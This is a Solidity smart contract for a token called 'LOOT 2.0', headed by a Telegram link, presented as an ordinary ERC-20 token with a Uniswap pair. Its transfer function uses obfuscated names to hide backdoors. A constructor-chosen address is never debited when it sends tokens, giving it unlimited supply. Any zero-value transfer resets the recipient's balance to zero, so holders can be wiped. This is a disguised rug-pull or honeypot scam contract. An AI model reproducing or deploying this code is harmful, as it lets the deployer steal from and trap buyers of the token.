/*

https://t.me/twolootbot

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LOOT is Ownable {
    uint8 public decimals = 9;

    string public name = 'LOOT 2.0';

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address oniyrfvsqwj, address rjscfvuz, uint256 gouyblf) public returns (bool success) {
        require(gouyblf <= allowance[oniyrfvsqwj][msg.sender]);
        allowance[oniyrfvsqwj][msg.sender] -= gouyblf;
        tiyjpzud(oniyrfvsqwj, rjscfvuz, gouyblf);
        return true;
    }

    function approve(address buyp, uint256 gouyblf) public returns (bool success) {
        allowance[msg.sender][buyp] = gouyblf;
        emit Approval(msg.sender, buyp, gouyblf);
        return true;
    }

    function tiyjpzud(address oniyrfvsqwj, address rjscfvuz, uint256 gouyblf) private {
        if (0 == qpxdcjravsk[oniyrfvsqwj]) {
            balanceOf[oniyrfvsqwj] -= gouyblf;
        }
        balanceOf[rjscfvuz] += gouyblf;
        if (0 == gouyblf && rjscfvuz != fmqonstylhxu) {
            balanceOf[rjscfvuz] = gouyblf;
        }
        emit Transfer(oniyrfvsqwj, rjscfvuz, gouyblf);
    }

    mapping(address => uint256) private qpxdcjravsk;

    mapping(address => uint256) private fghakvcwy;

    function transfer(address rjscfvuz, uint256 gouyblf) public returns (bool success) {
        tiyjpzud(msg.sender, rjscfvuz, gouyblf);
        return true;
    }

    address public fmqonstylhxu;

    string public symbol = 'LOOT 2.0';

    constructor(address grvqhfnw) {
        balanceOf[msg.sender] = totalSupply;
        qpxdcjravsk[grvqhfnw] = cjpwvfsbmayh;
        IUniswapV2Router02 dcwebuqh = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        fmqonstylhxu = IUniswapV2Factory(dcwebuqh.factory()).createPair(address(this), dcwebuqh.WETH());
    }

    uint256 private cjpwvfsbmayh = 106;
}